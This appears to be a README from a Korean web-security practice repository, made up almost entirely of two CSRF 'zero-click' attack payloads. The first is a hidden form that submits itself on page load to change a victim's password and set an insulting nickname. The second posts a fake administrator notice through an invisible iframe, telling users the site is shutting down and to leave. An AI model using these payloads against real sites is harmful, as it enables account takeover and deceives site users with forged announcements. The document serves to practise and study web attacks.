# web3

<h1> 웹 보안 연습용 </h1> 
<p> 2021년 6월 12일 시작 </p>

  * <h3>제로 클릭 어택 </h3>


          <form  id="hack" action="../info_change.php" method="POST">
          <input type="hidden" name="user_pw1" value="1212" >
          <input type="hidden" name="user_pw2" value="1212" >
          <input type="hidden" name="age" value="50">
          <input type="hidden" name="nick" value="멍청이">
          <input type="hidden" name="email" value="">
          </form>
          <script>
          document.getElementById("hack").submit();
          </script    >


 * <h3>CSRF 제로 클릭 어택 </h3>

       <iframe name ="a" width ="0" height ="0" sandbox></iframe> 
       <form id ="hack" action="board_write_ok.php" method="post" target="a">
       <input type="hidden" name="name" value="관리자" >
       <input type="hidden" name="pw" value="12345" >
       <input type="hidden" name="email" value="admin@kh.com">
       <input type="hidden" name="sub" value="[필독]공지사항">
       <input type="hidden" name="tag" value="T">
       <input type="hidden" name="cont" value="우리 사이트가 서비스가 종료되었음을 알리며 모두 탈퇴해주십쇼">
       <input type="hidden" name="att_file" value="">
       </from>
       <script>
       document.getElementById("hack").submit();
       </script    >
